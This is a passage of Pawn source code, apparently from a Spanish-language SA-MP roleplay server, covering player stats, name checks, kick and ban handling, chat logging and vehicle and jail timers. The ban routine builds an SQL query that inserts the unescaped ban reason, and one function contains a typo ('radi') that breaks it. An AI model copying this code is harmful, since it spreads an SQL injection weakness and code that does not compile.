				format(phoneNetwork, sizeof(phoneNetwork), "%s", Business[PlayerInfo[targetid][pPhoneC]][bName]);
			}

			if(PlayerInfo[targetid][pPhoneNumber] == 0) {
				phoneText = "No";
			} else {
				format(phoneText, sizeof(phoneText), "%d", PlayerInfo[targetid][pPhoneNumber]);
			}
			SendClientMessage(playerid, COLOR_LIGHTYELLOW, "============================[General IC]=============================");
			SendFMessage(playerid, COLOR_WHITE, "Nombre: %s | Zona: %s | Dinero: $%d | Banco: $%d | Edad: %d | Sexo: %s", GetPlayerNameEx(targetid), location, GetPlayerCash(targetid), PlayerInfo[targetid][pBank], PlayerInfo[targetid][pAge], sexText);
			SendFMessage(playerid, COLOR_WHITE, "Tel�fono: %s | Empresa telef�nica: %s | Empleo: %s | Facci�n: %s | Rango: %s", phoneText, phoneNetwork, jText, pFactionName, fRankT);
			SendFMessage(playerid, COLOR_WHITE,	"[Licencias] Conducci�n: %s | Vuelo: %s | Portaci�n de armas: %s", cLicense, fLicense, wLicense);
			SendClientMessage(playerid, COLOR_LIGHTYELLOW, "============================[General OOC]===========================");
			SendFMessage(playerid, COLOR_WHITE, "Salud: %.1f | Nivel: %d | Experiencia: %d/%d | Advertencias: %d", health, PlayerInfo[targetid][pLevel], PlayerInfo[targetid][pExp], (PlayerInfo[targetid][pLevel] + 1) * ServerInfo[svLevelExp], PlayerInfo[targetid][pWarnings]);
   			SendFMessage(playerid, COLOR_WHITE,	"Casa: %d | Casa rentada: %d | Negocio: %d | Horas de juego: %d", PlayerInfo[targetid][pHouseKey], PlayerInfo[targetid][pHouseKeyIncome], PlayerInfo[targetid][pBizKey], PlayerInfo[targetid][pPlayingHours]);
			
			printCarKeys(playerid,targetid);
			
			if(admin) {
			    SendClientMessage(playerid, COLOR_LIGHTYELLOW, "==============================[DEBUG]==============================");
				SendFMessage(playerid, COLOR_WHITE,	"Negocio actual: %d | Skin: %d | Mundo: %d | Interior: %d | Ultveh: %d | pCantWork: %d | pJobAllowed: %d | pID %d", GetPlayerBusiness(targetid), PlayerInfo[targetid][pSkin], GetPlayerVirtualWorld(targetid), GetPlayerInterior(targetid), LastVeh[targetid], PlayerInfo[targetid][pCantWork], PlayerInfo[targetid][pJobAllowed], PlayerInfo[targetid][pID]);
                SendFMessage(playerid, COLOR_WHITE, "Adicci�n: %.1f %% | Abstinencia en: %d min | Hambre: %d | Sed: %d", PlayerInfo[targetid][pAdictionPercent], PlayerInfo[targetid][pAdictionAbstinence] / 60, PlayerInfo[targetid][pHunger], PlayerInfo[targetid][pThirst]);
			}
			SendClientMessage(playerid, COLOR_LIGHTYELLOW, "===================================================================");
		}
	}
	return 1;
}

stock IsSkinValid(SkinID) return ((SkinID >= 0 && SkinID <= 1)||(SkinID == 2)||(SkinID == 7)||(SkinID >= 9 && SkinID <= 41)||(SkinID >= 43 && SkinID <= 85)||(SkinID >=87 && SkinID <= 118)||(SkinID >= 120 && SkinID <= 148)||(SkinID >= 150 && SkinID <= 207)||(SkinID >= 209 && SkinID <= 272)||(SkinID >= 274 && SkinID <= 288)||(SkinID >= 290 && SkinID <= 299)) ? true:false;

stock ClearScreen(playerid) {
	for(new i = 0; i < 100; i++) {
	    SendClientMessage(playerid, COLOR_WHITE, " ");
	}
	return 0;
}

stock GetPlayerFirstName(playerid) {
	new namestring[2][MAX_PLAYER_NAME];
	new name[MAX_PLAYER_NAME];
	GetPlayerName(playerid,name,MAX_PLAYER_NAME);
	split2(name, namestring, '_');
	return namestring[0];
}

stock GetPlayerLastName(playerid) {
	new namestring[2][MAX_PLAYER_NAME];
	new name[MAX_PLAYER_NAME];
	GetPlayerName(playerid,name,MAX_PLAYER_NAME);
	split2(name, namestring, '_');
	return namestring[1];
}

stock GetVehicleCount() {
	new count;
	for(new v = 1; v < MAX_VEH; v++)
	{
		if (IsVehicleSpawned(v)) count++;
	}
	return count;
}

stock IsVehicleSpawned(vehicleid) {
	new Float:VX,Float:VY,Float:VZ;
	GetVehiclePos(vehicleid,VX,VY,VZ);
	if (VX == 0.0 && VY == 0.0 && VZ == 0.0) return 0;
	return 1;
}

stock GetPlayerIpAddress(playerid) {
	new IP[16];
	GetPlayerIp(playerid, IP, sizeof(IP));
	return IP;
}

RPName(playerid) {
    new
        name[MAX_PLAYER_NAME],
		charCounts[5];

	GetPlayerName(playerid, name, sizeof(name));

	for(new n; n < MAX_PLAYER_NAME; n++) {
		switch(name[n]) {
			case '[', ']', '.', '$', '(', ')', '@', '=': charCounts[1]++;
			case '_': charCounts[0]++;
			case '0' .. '9': charCounts[2]++;
			case 'a' .. 'z': charCounts[3]++;
			case 'A' .. 'Z': charCounts[4]++;
		}
	}
	if(charCounts[0] == 0 || charCounts[0] >= 3) {
	    KickPlayer(playerid,"el sistema","nombre inv�lido, utiliza un gui�n bajo, ej: Roberto_Fuentes");
		return 0;
	} else if(charCounts[1] >= 1) {
	   	KickPlayer(playerid,"el sistema","nombre inv�lido, no debes utilizar s�mbolos, ej: Roberto_Fuentes");
		return 0;
	} else if(charCounts[2] >= 1) {
	 	KickPlayer(playerid,"el sistema","nombre inv�lido, no debes utilizar n�meros, ej: Roberto_Fuentes");
		return 0;
	} else if(charCounts[3] == strlen(name) - 1) {
	   	KickPlayer(playerid,"el sistema","utiliza iniciales en may�sculas, ej: Roberto_Fuentes");
		return 0;
	} else if(charCounts[4] == strlen(name) - 1) {
		KickPlayer(playerid,"el sistema","nombre inv�lido, solo iniciales en may�sculas, ej: Roberto_Fuentes");
		return 0;
	} else {
		return 1;
	}
}

stock GetPlayerNameEx(playerid) {
    new string[24];
    GetPlayerName(playerid,string,24);
    new str[24];
    strmid(str,string,0,strlen(string),24);
    for(new i = 0; i < MAX_PLAYER_NAME; i++)
    {
        if (str[i] == '_') str[i] = ' ';
    }
    return str;
}

stock GetObjectCount() {
	new count;
	for(new o; o < MAX_OBJECTS; o++)
	{
		if (IsValidObject(o)) count++;
	}
	return count;
}

ReturnUser(text[], playerid = INVALID_PLAYER_ID)
{
	new pos = 0;
	while (text[pos] < 0x21) // Strip out leading spaces
	{
		if (text[pos] == 0) return INVALID_PLAYER_ID; // No passed text
		pos++;
	}
	new userid = INVALID_PLAYER_ID;
	if (IsNumeric(text[pos])) // Check whole passed string
	{
		// If they have a numeric name you have a problem (although names are checked on id failure)
		userid = strval(text[pos]);
		if (userid >=0 && userid < MAX_PLAYERS)
		{
			if(!IsPlayerConnected(userid))
			{
				/*if (playerid != INVALID_PLAYER_ID)
				{
					SendClientMessage(playerid, 0xFF0000AA, "User not connected");
				}*/
				userid = INVALID_PLAYER_ID;
			}
			else
			{
				return userid; // A player was found
			}
		}
		/*else
		{
			if (playerid != INVALID_PLAYER_ID)
			{
				SendClientMessage(playerid, 0xFF0000AA, "Invalid user ID");
			}
			userid = INVALID_PLAYER_ID;
		}
		return userid;*/
		// Removed for fallthrough code
	}
	// They entered [part of] a name or the id search failed (check names just incase)
	new len = strlen(text[pos]);
	new count = 0;
	new name[MAX_PLAYER_NAME];
	foreach(new i : Player)
	{

			GetPlayerName(i, name, sizeof (name));
			if (strcmp(name, text[pos], true, len) == 0) // Check segment of name
			{
				if (len == strlen(name)) // Exact match
				{
					return i; // Return the exact player on an exact match
					// Otherwise if there are two players:
					// Me and MeYou any time you entered Me it would find both
					// And never be able to return just Me's id
				}
				else // Partial match
				{
					count++;
					userid = i;
				}
			}

	}
	if (count != 1)
	{
		if (playerid != INVALID_PLAYER_ID)
		{
			if (count)
			{
				SendClientMessage(playerid, 0xFF0000AA, "Multiple users found, please narrow earch");
			}
			else
			{
				SendClientMessage(playerid, 0xFF0000AA, "No matching user found");
			}
		}
		userid = INVALID_PLAYER_ID;
	}
	return userid; // INVALID_USER_ID for bad return
}
IsNumeric(const string[])
{
	for (new i = 0, j = strlen(string); i < j; i++)
	{
		if (string[i] > '9' || string[i] < '0') return 0;
	}
	return 1;
}


public kickTimer(playerid) {
	return Kick(playerid);
}

public banTimer(playerid) {
	return Ban(playerid);
}

public KickPlayer(playerid, kickedby[MAX_PLAYER_NAME], reason[])
{
	new string[128];
		
	foreach(new i : Player)
	{
	    if(i == playerid)
		{
	        SendFMessage(i, COLOR_ADMINCMD, "Has sido expulsado/a por %s, raz�n: %s", kickedby, reason);
	    } else if(PlayerInfo[i][pAdmin] > 0)
		{
	        SendFMessage(i, COLOR_ADMINCMD, "%s ha sido expulsado/a por %s, raz�n: %s.", GetPlayerNameEx(playerid), kickedby, reason);
	    }
	}
	format(string, sizeof(string), "%s ha sido expulsado/a por %s, raz�n: %s.", GetPlayerNameEx(playerid), kickedby, reason);
	KickLog(string);
	SetTimerEx("kickTimer", 1000, false, "d", playerid);
	return 1;
}

public BanPlayer(playerid, issuerid, reason[]) {
	new
	    pid,
	   	year, month, day,
	    hour, minute, second,
	    targetName[24], issuerName[24], targetIP[16],
		query[512];

    getdate(year, month, day);
	gettime(hour, minute, second);
	
	if(issuerid == INVALID_PLAYER_ID) {
		issuerName = "el servidor";
		pid = -1;
	} else {
	    pid = PlayerInfo[issuerid][pID];
	}
		
	GetPlayerName(issuerid, issuerName, 24);
	GetPlayerName(playerid, targetName, 24);
	mysql_real_escape_string(issuerName, issuerName,1,sizeof(issuerName));
	mysql_real_escape_string(targetName, targetName, 1,sizeof(issuerName));
	
	GetPlayerIp(playerid, targetIP, sizeof(targetIP));

	format(query, sizeof(query), "INSERT INTO `bans` (pID, pName, pIP, banDate, banEnd, banReason, banIssuerID, banIssuerName, banActive) VALUES (%d, '%s', '%s', '%02d-%02d-%02d %02d:%02d:%02d', '%02d-%02d-%02d %02d:%02d:%02d', '%s', %d, '%s', 1)",
		PlayerInfo[playerid][pID],
		targetName,
		targetIP,
		year,
		month,
		day,
		hour,
		minute,
		second,
		3040,
		12,
		1,
		0,
		0,
		0,
		reason,
		pid,
		issuerName
	);
	mysql_function_query(dbHandle, query, false, "", "");

	foreach(new i : Player) {
	    if(i == playerid) {
	        SendFMessage(i, COLOR_ADMINCMD, "Has sido baneado/a por %s, raz�n: %s", issuerName, reason);
	    } else {
	        SendFMessage(i, COLOR_ADMINCMD, "%s ha sido baneado/a por %s, raz�n: %s.", targetName, issuerName, reason);
	    }
	}
	TogglePlayerControllable(playerid, false);
	SendClientMessage(playerid, COLOR_WHITE, "Para m�s informaci�n pasa por nuestros foros en www.malosaires.com.ar");
	SetTimerEx("kickTimer", 1000, false, "d", playerid);
	return 1;
}

stock PlayerToPoint(Float:radius, playerID, Float:x, Float:y, Float:z) {
	new
		Float:oldX,
		Float:oldY,
		Float:oldZ,
		Float:xTemp,
		Float:yTemp,
		Float:zTemp;

	GetPlayerPos(playerID, oldX, oldY, oldZ);
	xTemp = (oldX -x);
	yTemp = (oldY -y);
	zTemp = (oldZ -z);
	if(((xTemp < radius) && (xTemp > -radius)) && ((yTemp < radius) && (yTemp > -radius)) && ((zTemp < radius) && (zTemp > -radius))) {
		return 1;
	}
	return 0;
}

stock ShowServerPassword() {
	new pass[128];
	if (strlen(PASSWORD) != 0) {
		format(pass, sizeof pass, "%s", PASSWORD);
	} else {
	    pass = "None";
	}
	return pass;
}

//====================================================[Chat Functions]=============================================================

public SendFactionMessage(faction, color, string[])
{
	foreach(new i : Player)
	{
		if(PlayerInfo[i][pFaction] == faction)
			SendClientMessage(i, color, string);
	}
}

//==================================================================================================================================

public fuelTimer()
{
 	// Los que estan arriba (se podr�a borrar y dejar solo lo otro salvo por el mensaje de que te quedaste sin combustible)
	new vehicle, vehModelType;
	
	foreach(new i : Player)
	{
   	    if(GetPlayerState(i) == PLAYER_STATE_DRIVER)
   	    {
   	        vehicle = GetPlayerVehicleID(i);
   	        if(VehicleInfo[vehicle][VehEngine] == 1)
   	        {
   	            if(VehicleInfo[vehicle][VehFuel] < 1)
   	            {
   	                GameTextForPlayer(i, "~r~Te has quedado sin combustible.",1500,3);
   	                SetEngine(vehicle, 0);
				}
			}
		}
	}
	// Veh�culos
	for(new c = 0; c < MAX_VEH; c++)
	{
 		GetVehicleDamageStatus(c, VehicleInfo[c][VehDamage1], VehicleInfo[c][VehDamage2], VehicleInfo[c][VehDamage3], VehicleInfo[c][VehDamage4]);
	    GetVehicleParamsEx(c, VehicleInfo[c][VehEngine], VehicleInfo[c][VehLights], VehicleInfo[c][VehAlarm], vlocked, VehicleInfo[c][VehBonnet], VehicleInfo[c][VehBoot], VehicleInfo[c][VehObjective]);
        if(VehicleInfo[c][VehEngine] == 1)
		{
		    vehModelType = GetVehicleType(c);
		    if((VehicleInfo[c][VehType] == VEH_OWNED ||
	 			VehicleInfo[c][VehType] == VEH_FACTION ||
				VehicleInfo[c][VehType] == VEH_RENT) &&
				(vehModelType != VTYPE_HELI &&
				vehModelType != VTYPE_BMX &&
				vehModelType != VTYPE_PLANE &&
				vehModelType != VTYPE_SEA) )
			{
				if(VehicleInfo[c][VehFuel] >= 1)
					VehicleInfo[c][VehFuel]--;
				else
					SetEngine(c, 0);
			} else
			    VehicleInfo[c][VehFuel] = 100;
		}
	}
	return 1;
}

stock IsAtATM(playerid) {
	if(PlayerToPoint(1.0,playerid,1350.3433,-1758.5756,13.5078)
	   || PlayerToPoint(1.0,playerid,1144.1825,-1765.3004,13.6190)
	   || PlayerToPoint(1.0,playerid,1834.2802,-1851.6484,13.3897)
	   || PlayerToPoint(1.0,playerid,527.4268,-1739.4935,11.7066)
	   || PlayerToPoint(1.0,playerid,1317.4628,-898.6657,39.5781)
	   || PlayerToPoint(1.0,playerid,486.4542,-1271.3389,15.6990)
	   || PlayerToPoint(1.0,playerid,1594.2991,-2334.9038,13.5398)
	   || PlayerToPoint(1.0,playerid,2423.6157,-1220.1835,25.4946)
	   || PlayerToPoint(1.0,playerid,2232.5903,-1161.5964,25.8906)
	   || PlayerToPoint(1.0,playerid,2422.7905,-1959.7603,13.5375)
	   || PlayerToPoint(1.0,playerid,1186.7105,-1368.3475,13.5743))	{
		return 1;
	}
	return 0;
}

IsAtGasStation(playerid)
{
    if(IsPlayerConnected(playerid))
	{
		if(PlayerToPoint(6.0,playerid,1004.0070,-939.3102,42.1797) || PlayerToPoint(6.0,playerid,1944.3260,-1772.9254,13.3906) || PlayerToPoint(6.0,playerid,657.2998,-565.4222,15.9007))
		{//LS
		    return 1;
		}
		else if(PlayerToPoint(6.0,playerid,-90.5515,-1169.4578,2.4079) || PlayerToPoint(6.0,playerid,-1609.7958,-2718.2048,48.5391))
		{//LS
		    return 1;
		}
		else if(PlayerToPoint(6.0,playerid,-2029.4968,156.4366,28.9498) || PlayerToPoint(8.0,playerid,-2408.7590,976.0934,45.4175))
		{//SF
		    return 1;
		}
		else if(PlayerToPoint(5.0,playerid,-2243.9629,-2560.6477,31.8841) || PlayerToPoint(8.0,playerid,-1676.6323,414.0262,6.9484))
		{//Between LS and SF
		    return 1;
		}
		else if(PlayerToPoint(6.0,playerid,2202.2349,2474.3494,10.5258) || PlayerToPoint(10.0,playerid,614.9333,1689.7418,6.6968))
		{//LV
		    return 1;
		}
		else if(PlayerToPoint(8.0,playerid,-1328.8250,2677.2173,49.7665) || PlayerToPoint(6.0,playerid,70.3882,1218.6783,18.5165))
		{//LV
		    return 1;
		}
		else if(PlayerToPoint(8.0,playerid,2113.7390,920.1079,10.5255) || PlayerToPoint(6.0,playerid,-1327.7218,2678.8723,50.0625))
		{//LV
		    return 1;
		}
		else if(PlayerToPoint(6.0,playerid,2319.4900, -1356.4971, 23.9954) || PlayerToPoint(10.0,playerid,609.5114, -1511.2644, 14.9247))
		{// LS NEW
		    return 1;
		}
        else if(PlayerToPoint(10.0,playerid,2257.4990, -2439.8804, 13.5243) || PlayerToPoint(6.0,playerid,1377.2927, -1757.9093, 13.7249))
		{// LS NEW
		    return 1;
		}
		else if(PlayerToPoint(10.0,playerid,1634.2987,-1824.2925,14.2372)) {// Taller
		if(PlayerInfo[playerid][pFaction] == FAC_MECH) {
		    return 1;
		    } else {
		        SendClientMessage(playerid, COLOR_YELLOW2, "Debes pertenecer al taller mec�nico.");
		    }
		}
		else if(PlayerToPoint(6.0, playerid, 1575.4045,-1618.2090,13.1889)) {
		    if(PlayerInfo[playerid][pFaction] == FAC_PMA) {
		        return 1;
		    } else {
		        SendClientMessage(playerid, COLOR_YELLOW2, "Debes pertenecer a la polic�a.");
		    }
		}
	}
	return 0;
}

stock IsAtDealership(playerid)
{
    if (PlayerToPoint(35.0, playerid, 2128.0864, -1135.3912, 25.5855) ||
		PlayerToPoint(50.0, playerid, 537.3366, -1293.2140, 17.2422) ||
		PlayerToPoint(35.0, playerid, 2940.2000, -2051.7338, 3.5480)) {
        return 1;
    }
    return 0;
}

stock IsAtBlackMarket(playerid)
{
	if (PlayerToPoint(2.0, playerid, POS_BM1_X, POS_BM1_Y, POS_BM1_Z) ||
		PlayerToPoint(2.0, playerid, POS_BM2_X, POS_BM2_Y, POS_BM2_Z) ||
		PlayerToPoint(2.0, playerid, POS_BM3_X, POS_BM3_Y, POS_BM3_Z)) {
        return 1;
    }
    return 0;
}

stock IsVehicleParkedAtDealership(vehicleid)
{
    if (ParkedVehicleToPoint(35.0, vehicleid, 2128.0864, -1135.3912, 25.5855) ||
		ParkedVehicleToPoint(50.0, vehicleid, 537.3366, -1293.2140, 17.2422) ||
		ParkedVehicleToPoint(35.0, vehicleid, 2940.2000, -2051.7338, 3.5480)) {
        return 1;
    }
    return 0;
}

stock ParkedVehicleToPoint(Float:radius, vehicleid, Float:x, Float:y, Float:z)
{
	new Float:oldX, Float:oldY, Float:oldZ, Float:xTemp, Float:yTemp, Float:zTemp;

	oldX = VehicleInfo[vehicleid][VehPosX];
	oldY = VehicleInfo[vehicleid][VehPosY];
	oldZ = VehicleInfo[vehicleid][VehPosZ];
	xTemp = (oldX -x);
	yTemp = (oldY -y);
	zTemp = (oldZ -z);
	if(((xTemp < radi) && (xTemp > -radius)) && ((yTemp < radius) && (yTemp > -radius)) && ((zTemp < radius) && (zTemp > -radius))) {
		return 1;
	}
	return 0;
}

//====[ACTION MESSAGES]=========================================================
PlayerLocalMessage(playerid,Float:radius,message[])
{
	new string[128];
	format(string, sizeof(string), "(( [%d] %s: %s ))", playerid, GetPlayerNameEx(playerid), message);
	ProxDetector(radius, playerid, string, COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
	format(string, sizeof(string), "[OOC-LOCAL] %s", string);
	log(playerid, LOG_CHAT, string);
	return 1;
}

PlayerActionMessage(playerid,Float:radius,message[])
{
	new string[128];
	if(!usingMask[playerid])
		format(string, sizeof(string), "* %s %s", GetPlayerNameEx(playerid), message);
	else
	    format(string, sizeof(string), "* Enmascarado %d %s", maskNumber[playerid], message);
	ProxDetector(radius, playerid, string, COLOR_ACT1,COLOR_ACT2,COLOR_ACT3,COLOR_ACT4,COLOR_ACT5);
	PlayerActionLog(string);
	return 1;
}

PlayerDoMessage(playerid,Float:radius,message[])
{
	new string[128];
	if(!usingMask[playerid])
		format(string, sizeof(string), "* %s (( %s ))", message, GetPlayerNameEx(playerid));
	else
	    format(string, sizeof(string), "* %s (( Enmascarado %d ))", message, maskNumber[playerid]);
	ProxDetector(radius, playerid, string, COLOR_DO1,COLOR_DO2,COLOR_DO3,COLOR_DO4,COLOR_DO5);
	PlayerActionLog(string);
	return 1;
}

PlayerPlayerActionMessage(playerid,targetid,Float:radius,message[])
{
	new string[128];

	if(!usingMask[playerid])
	{
	    if(!usingMask[targetid])
	        format(string, sizeof(string), "* %s %s %s.", GetPlayerNameEx(playerid), message, GetPlayerNameEx(targetid));
		else
		    format(string, sizeof(string), "* %s %s Enmascarado %d.", GetPlayerNameEx(playerid), message, maskNumber[targetid]);
	}
	else
	{
		if(!usingMask[targetid])
	        format(string, sizeof(string), "* Enmascarado %d %s %s.", maskNumber[playerid], message, GetPlayerNameEx(targetid));
		else
		    format(string, sizeof(string), "* Enmascarado %d %s Enmascarado %d.", maskNumber[playerid], message, maskNumber[targetid]);
	}
	ProxDetector(radius, playerid, string, COLOR_ACT1,COLOR_ACT2,COLOR_ACT3,COLOR_ACT4,COLOR_ACT5);
	PlayerActionLog(string);
	return 1;
}

PlayerCmeMessage(playerid, Float:drawdistance, timeexpire, str[])
{
	new string[128];

	if(HasPlayerDesc(playerid))
		HidePlayerDesc(playerid, timeexpire + 2000); // La descripcion es escondida 2 segundos m�s que la duracion del cme.

    SetPlayerChatBubble(playerid, str, COLOR_ACT1, drawdistance, timeexpire);
	if(!usingMask[playerid])
		format(string, sizeof(string), "* %s %s", GetPlayerNameEx(playerid), str);
	else
	    format(string, sizeof(string), "* Enmascarado %d %s", maskNumber[playerid], str);
	SendClientMessage(playerid, COLOR_ACT1, string);
    return 1;
}
//==============================================================================


public KickLog(string[]) {
	new
	    time[3],
	    date[3],
	    entry[256],
	    File:hFile;
	    
    getdate(date[0], date[1], date[2]);
	gettime(time[0], time[1], time[2]);
	
	format(entry, sizeof(entry), "[%d/%d/%d %d:%d:%d] - %s\r\n", date[0], date[1], date[2], time[0], time[1], time[2], string);
	hFile = fopen("isamp-data/Logs/kick.log", io_append);
	fwrite(hFile, entry);
	fclose(hFile);
}

public PlayerActionLog(string[]) {
	new
	    time[3],
	    date[3],
	    entry[256],
	    File:hFile;

    getdate(date[0], date[1], date[2]);
	gettime(time[0], time[1], time[2]);
	
	format(entry, sizeof(entry), "[%d/%d/%d %d:%d:%d] - %s\r\n", date[0], date[1], date[2], time[0], time[1], time[2], string);
	hFile = fopen("isamp-data/Logs/playeraction.log", io_append);
	fwrite(hFile, entry);
	fclose(hFile);
}
public PlayerLocalLog(string[]) {
	new
	    time[3],
	    date[3],
	    entry[256],
	    File:hFile;

    getdate(date[0], date[1], date[2]);
	gettime(time[0], time[1], time[2]);

	format(entry, sizeof(entry), "[%d/%d/%d %d:%d:%d] - %s\r\n", date[0], date[1], date[2], time[0], time[1], time[2], string);
	hFile = fopen("isamp-data/Logs/playerlocal.log", io_append);
	fwrite(hFile, entry);
	fclose(hFile);
}

public TalkLog(string[]) {
	new
	    time[3],
	    date[3],
	    entry[256],
	    File:hFile;

    getdate(date[0], date[1], date[2]);
	gettime(time[0], time[1], time[2]);
	
	format(entry, sizeof(entry), "[%d/%d/%d %d:%d:%d] - %s\r\n", date[0], date[1], date[2], time[0], time[1], time[2], string);
	hFile = fopen("isamp-data/Logs/talk.log", io_append);
	fwrite(hFile, entry);
	fclose(hFile);
}

public FactionChatLog(string[]) {
	new
	    time[3],
	    date[3],
	    entry[256],
	    File:hFile;

    getdate(date[0], date[1], date[2]);
	gettime(time[0], time[1], time[2]);
	
	format(entry, sizeof(entry), "[%d/%d/%d %d:%d:%d] - %s\r\n", date[0], date[1], date[2], time[0], time[1], time[2], string);
	hFile = fopen("isamp-data/Logs/factionchat.log", io_append);
	fwrite(hFile, entry);
	fclose(hFile);
}

public SMSLog(string[]) {
	new
	    time[3],
	    date[3],
	    entry[256],
	    File:hFile;

    getdate(date[0], date[1], date[2]);
	gettime(time[0], time[1], time[2]);
	
	format(entry, sizeof(entry), "[%d/%d/%d %d:%d:%d] - %s\r\n", date[0], date[1], date[2], time[0], time[1], time[2], string);
	hFile = fopen("isamp-data/Logs/sms.log", io_append);
	fwrite(hFile, entry);
	fclose(hFile);
}

public PMLog(string[]) {
	new
	    time[3],
	    date[3],
	    entry[256],
	    File:hFile;

    getdate(date[0], date[1], date[2]);
	gettime(time[0], time[1], time[2]);
	
	format(entry, sizeof(entry), "[%d/%d/%d %d:%d:%d] - %s\r\n", date[0], date[1], date[2], time[0], time[1], time[2], string);
	hFile = fopen("isamp-data/Logs/mp.log", io_append);
	fwrite(hFile, entry);
	fclose(hFile);
}

public DonatorLog(string[]) {
	new
	    time[3],
	    date[3],
	    entry[256],
	    File:hFile;

    getdate(date[0], date[1], date[2]);
	gettime(time[0], time[1], time[2]);
	
	format(entry, sizeof(entry), "[%d/%d/%d %d:%d:%d] - %s\r\n", date[0], date[1], date[2], time[0], time[1], time[2], string);
	hFile = fopen("isamp-data/Logs/donator.log", io_append);
	fwrite(hFile, entry);
	fclose(hFile);
}

public ReportLog(string[]) {
	new
	    time[3],
	    date[3],
	    entry[256],
	    File:hFile;

    getdate(date[0], date[1], date[2]);
	gettime(time[0], time[1], time[2]);

	format(entry, sizeof(entry), "[%d/%d/%d %d:%d:%d] - %s\r\n", date[0], date[1], date[2], time[0], time[1], time[2], string);
	hFile = fopen("isamp-data/Logs/report.log", io_append);
	fwrite(hFile, entry);
	fclose(hFile);
}

public OOCLog(string[]) {
	new
	    time[3],
	    date[3],
	    entry[256],
	    File:hFile;

    getdate(date[0], date[1], date[2]);
	gettime(time[0], time[1], time[2]);
	
	format(entry, sizeof(entry), "[%d/%d/%d %d:%d:%d] - %s\r\n", date[0], date[1], date[2], time[0], time[1], time[2], string);
	hFile = fopen("isamp-data/Logs/ooc.log", io_append);
	fwrite(hFile, entry);
	fclose(hFile);
}
//============================================================================================================================

stock AdministratorMessage(color, const string[], level)
{
	foreach(new i : Player)
	{
		if(PlayerInfo[i][pAdmin] >= level)
			SendClientMessage(i, color, string);
	}
	print(string);
	return 1;
}

public HangupTimer(playerid)
{
	if(!IsPlayerInAnyVehicle(playerid))
	{
		if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USECELLPHONE)
		{
			SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
			return 1;
		}
	}
	return 0;
}

PlayerName(playerid) {
  new name[MAX_PLAYER_NAME];
  GetPlayerName(playerid, name, sizeof(name));
  return name;
}

public cantSaveItems(playerid) {
	SetPVarInt(playerid, "cantSaveItems", 0);
	return 1;
}

public healTimer(playerid) {
    if(GetPVarInt(playerid, "isHealing") != 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Tu oferta se ha cancelado, el herido no la ha aceptado.");
		SendClientMessage(GetPVarInt(playerid, "healTarget"), COLOR_WHITE, "Ha pasado demasiado tiempo y has rechazado la oferta del m�dico.");
	}
	DeletePVar(DeletePVar(playerid, "healTarget"), "healIssuer");
	DeletePVar(DeletePVar(playerid, "healTarget"), "healCost");
	DeletePVar(playerid, "isHealing");
	DeletePVar(playerid, "healTarget");
	return 1;
}

public speedoTimer(playerid)
{
	new vehicleID = GetPlayerVehicleID(playerid), string[60];

 	if(VehicleInfo[vehicleID][VehFuel] > 30)
 	    format(string, sizeof(string), "Velocidad: %dkm/h~n~Combustible: ~g~%d%%", GetPlayerSpeed(playerid, true), VehicleInfo[vehicleID][VehFuel]); // verde
	else if(VehicleInfo[vehicleID][VehFuel] > 15)
		format(string, sizeof(string), "Velocidad: %dkm/h~n~Combustible: ~y~%d%%", GetPlayerSpeed(playerid, true), VehicleInfo[vehicleID][VehFuel]); // amarillo
	else
		format(string, sizeof(string), "Velocidad: %dkm/h~n~Combustible: ~r~%d%%", GetPlayerSpeed(playerid, true), VehicleInfo[vehicleID][VehFuel]); // rojo

    PlayerTextDrawSetString(playerid, PTD_Speedo[playerid], string);
	return 1;
}

HidePlayerSpeedo(playerid)
{
	PlayerTextDrawHide(playerid, PTD_Speedo[playerid]);
}

ShowPlayerSpeedo(playerid)
{
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		PlayerTextDrawShow(playerid, PTD_Speedo[playerid]);
	}
}

public vehicleTimer()
{
	new vehicleid, Float:Z_angle, Float:vHealth;
	
	foreach(new i : Player)
	{
		if(GetPlayerState(i) == PLAYER_STATE_DRIVER)
		{
			vehicleid = GetPlayerVehicleID(i);
			GetVehicleHealth(vehicleid, VehicleInfo[vehicleid][VehHP]);
			if(VehicleInfo[vehicleid][VehHP] <= 500 && VehicleInfo[vehicleid][VehType] != VEH_CREATED && VehicleInfo[vehicleid][VehEngine] == 1)
			{
				SetEngine(vehicleid, 0);
				SendClientMessage(i, COLOR_YELLOW2, "�El motor del veh�culo se encuentra da�ado, debes llamar a un mec�nico!");
				PlayerDoMessage(i , 15.0, "El motor del veh�culo est� muy averiado y se ha apagado.");
			}
		}
	}
	for(new v = 0; v < MAX_VEH; v++)
	{
		GetVehicleParamsEx(v, VehicleInfo[v][VehEngine], VehicleInfo[v][VehLights], VehicleInfo[v][VehAlarm], vlocked, VehicleInfo[v][VehBonnet], VehicleInfo[v][VehBoot], VehicleInfo[v][VehObjective]);
	    GetVehicleHealth(v, vHealth);
	    if(vHealth < 400)
	    {
	         SetVehicleHealth(v, 400);
			 GetVehicleZAngle(v, Z_angle);
	         SetVehicleZAngle(v, Z_angle + 0.1); //con esto el vehiculo si esta dado vuelta, vuelve a ponerse como debe.
	    }
	}
}

public JailTimer()
{
	new string[128];

	foreach(new i : Player)
	{
	    if(PlayerInfo[i][pJailed] > 0)
		{
	    	if(PlayerInfo[i][pJailTime] != 0)
			{
				if(!IsPlayerAfk(i))
				{
					PlayerInfo[i][pJailTime]--;
					format(string, sizeof(string), "~n~~n~~n~~n~~n~~n~~n~~w~Tiempo restante: ~g~%d segundos.",PlayerInfo[i][pJailTime]);
					GameTextForPlayer(i, string, 999, 3);
				}
			}
			if(PlayerInfo[i][pJailTime] == 0)
			{
			    switch(PlayerInfo[i][pJailed])
				{
			        case 1:
					{
			            PlayerInfo[i][pJailed] = 0;
						SendClientMessage(i, COLOR_LIGHTYELLOW2,"{878EE7}[Prisi�n]:{C8C8C8} has finalizado tu condena, puedes retirarte.");
						SetPlayerVirtualWorld(i, Building[2][blInsideWorld]);
					    SetPlayerInterior(i, 3);
						SetPlayerPos(i, 229.01, 151.30, 1003.02);
						SetPlayerFacingAngle(i, 270.0000);
						TogglePlayerControllable(i, true);
		  			}
			        case 2:
					{
			            SetPlayerVirtualWorld(i, 0);
			            PlayerInfo[i][pJailed] = 0;
